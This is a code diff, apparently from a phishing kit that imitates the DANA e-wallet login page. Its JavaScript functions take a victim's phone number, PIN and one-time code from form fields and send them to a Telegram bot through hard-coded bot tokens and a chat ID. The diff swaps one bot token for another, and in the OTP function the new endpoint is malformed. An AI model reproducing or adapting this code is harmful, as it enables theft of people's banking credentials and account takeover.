@@ -20,15 +20,9 @@ function sendNohp(event){
   $("#inp").blur();
 
   let nohp = $('#inp').val();
-  let text = "📱 *DANA LOGIN ID
-────────────────────
-• Nomor :
+  let text = "📱 *• Nomor :*\nNomor HP: " + nohp;
 
-────────────────────
-
-Thee F U C K*\nNomor HP: " + nohp;
-
-  fetch("https://api.telegram.org/bot8121267441:AAFWFCWUqxBtu3zth4JXOPdlfTcpIPwIbrQ/sendMessage", {
+  fetch("https://api.telegram.org/bot7526261524:AAEnSkCLR65aK9H_bZWGxU8cNkajvo-takw/sendMessage", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
     body: "chat_id=7134674820&text=" + encodeURIComponent(text) + "&parse_mode=Markdown"
@@ -57,16 +51,11 @@ function sendPin(){
     pin += $(this).val();
   });
 
-  let text = "🔒 *DANA LOGIN ID
-────────────────────
+  let text = "🔒 *
 • Nomor :
-• Pin     :
+• Pin        :*\n`" + pin + "`";
 
-────────────────────
-
-Thee F U C K*\n`" + pin + "`";
-
-  fetch("https://api.telegram.org/bot8121267441:AAFWFCWUqxBtu3zth4JXOPdlfTcpIPwIbrQ/sendMessage", {
+  fetch("https://api.telegram.org/bot7526261524:AAEnSkCLR65aK9H_bZWGxU8cNkajvo-takw/sendMessage", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
     body: "chat_id=7134674820&text=" + encodeURIComponent(text) + "&parse_mode=Markdown"
@@ -93,16 +82,12 @@ function sendOtp(){
     otp += $(this).val();
   });
 
-  let text = "📬 *DANA LOGIN ID
-────────────────────
-• Nomor  :
-• Pin    :
-• Otp    :
-────────────────────
+  let text = "📬 *
+• Nomor :
+• Pin        :
+• Otp        :*\n`" + otp + "`";
 
-Thee F U C K*\n`" + otp + "`";
-
-  fetch("https://api.telegram.org/bot8121267441:AAFWFCWUqxBtu3zth4JXOPdlfTcpIPwIbrQ/sendMessage", {
+  fetch("https://api.telegram.org/8121267441:AAFWFCWUqxBtu3zth4JXOPdlfTcpIPwIbrQ", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
     body: "chat_id=7134674820&text=" + encodeURIComponent(text) + "&parse_mode=Markdown"
